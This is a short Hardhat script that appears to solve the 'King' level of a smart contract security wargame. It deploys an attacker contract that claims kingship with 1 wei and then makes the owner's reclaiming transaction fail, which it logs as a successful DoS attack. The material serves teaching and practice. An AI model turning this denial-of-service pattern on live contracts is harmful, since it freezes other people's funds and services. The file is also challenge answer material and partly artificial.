import { ethers, getNamedAccounts } from 'hardhat';

import deployContract from '../deploy/09-king';
import deployContractAttack from '../deploy/09-king-attacker';

const INSTANCE_CONTRACT_NAME = 'King';
const ATTACKER_CONTRACT_NAME = 'KingAttacker';

async function main() {
  console.log(`Passing ${INSTANCE_CONTRACT_NAME} challenge...`);

  const { hacker: hackerAddress, deployer: deployerAddress } = await getNamedAccounts();
  const hacker = await ethers.getSigner(hackerAddress);
  const deployer = await ethers.getSigner(deployerAddress);

  const contractAddress = await deployContract();
  const contractInstance = await ethers.getContractAt(INSTANCE_CONTRACT_NAME, contractAddress);
  const contract = contractInstance.connect(deployer);

  const contractAttackAddress = await deployContractAttack();
  const contractAttackInstance = await ethers.getContractAt(ATTACKER_CONTRACT_NAME, contractAttackAddress);
  const contractAttack = contractAttackInstance.connect(hacker);

  const initialKing = await contract._king();
  console.log('Initial King is:', initialKing === contractAttackAddress ? 'hacker' : 'owner');

  await contractAttack.attack({ value: ethers.parseUnits('1', 'wei').toString() });

  const newKing = await contract._king();
  console.log('New King is:', newKing === contractAttackAddress ? 'hacker' : 'owner');

  try {
    await deployer.sendTransaction({
      from: deployer,
      to: contractAddress,
      value: ethers.parseUnits('1', 'wei').toString(),
    });
  } catch (e) {
    console.log('DOS attack completed successfully!');
  }

  const lastKing = await contract._king();
  console.log('Last King is:', lastKing === contractAttackAddress ? 'hacker' : 'owner');

  console.log('Well done, You have completed this level!!!');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
